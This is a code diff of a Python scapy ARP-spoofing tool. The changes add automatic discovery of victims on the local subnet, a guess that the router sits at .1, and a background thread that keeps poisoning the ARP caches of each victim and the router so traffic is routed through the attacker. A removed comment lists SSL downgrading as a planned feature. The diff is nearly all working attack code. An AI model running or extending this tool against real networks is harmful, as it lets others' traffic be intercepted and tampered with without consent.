@@ -5,6 +5,8 @@ import sys
 import scapy.all as scapy
 #from scapy.all import *
 import os
+import time
+import threading
 
 arp_looping = True #set this to false to stop the thread
 
@@ -48,32 +50,70 @@ def restore(victim_ip, source_ip):
     scapy.sendp(packet, count=4, verbose=False, iface=IFACE)
  
 
-def arp_main(attacker_addr, manual, router, input_iface, silent):
-    # TOADD: 
-    # - ssl downgrading
+def arp_prep(attacker_addr, manual, router, input_iface):
+    global victim_addresses, router_ip, IFACE, ATTACKER_IP, ATTACKER_MAC
+    
     if manual is None:
         print("No victim addresses given, quiting...")
         sys.exit()
     if router is None:
         print("No router address given, quiting...")
         sys.exit()
+    
     victim_addresses = manual
     router_ip = router
-    global IFACE
-    global ATTACKER_IP
-    global ATTACKER_MAC
+
     IFACE = input_iface
     ATTACKER_IP = attacker_addr[0]
     ATTACKER_MAC = attacker_addr[1]
-    sent_packets_count = 0  # initializing the packet counter
     print(ATTACKER_IP, ATTACKER_MAC)
 
+
+#Automated code
+victim_addresses = {}
+router_ip = None
+current_ip = None
+iface = None
+
+def arp_prep_automated(subnet, iface_ = "enp0s10") :
+    global victim_addresses, router_ip, iface, current_ip
+    global IFACE, ATTACKER_MAC
+
+    IFACE = iface_
+
+    current_ip = scapy.get_if_addr(iface_)
+    ATTACKER_MAC = scapy.get_if_hwaddr(iface_)
+    
+    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
+    router_ip = subnet + '.1' #usually router is at subnet .1
+
+    for i in range(1,10) :  # ips in subnet, should be (1, 255)
+        ip = subnet + "." + str(i)
+        try :
+            victim_addresses[ip] = get_mac(ip) #exists
+        except :
+            pass #does not exist
+
+    if current_ip in victim_addresses:
+        del victim_addresses[current_ip]
+    
+    
+    print("Victims: ", str(victim_addresses))
+
+def arp_tick():
+    for victim_ip, victim_mac in victim_addresses.items():
+            arp_spoof(victim_ip, router_ip) #send to victim that we are router
+            arp_spoof(router_ip, victim_ip) #send to router that we are victim
+
+arp_thread = None
+def arp_run():
+    #run arp_thread on a thread
+    global arp_thread
+    arp_thread = threading.Thread(target=arp_loop)
+    arp_thread.daemon = True
+    arp_thread.start()
+
+def arp_loop():
     while arp_looping:
-        for victim_ip in victim_addresses:
-            sent_packets_count += 2
-            arp_spoof(victim_ip, router_ip)
-            arp_spoof(router_ip, victim_ip)
-            sys.stdout.flush()
-            print("[+] Packets sent " + str(sent_packets_count) + "end=\r")
-            sys.stdout.flush()
-            time.sleep(2)
+        arp_tick()
+        time.sleep(5)
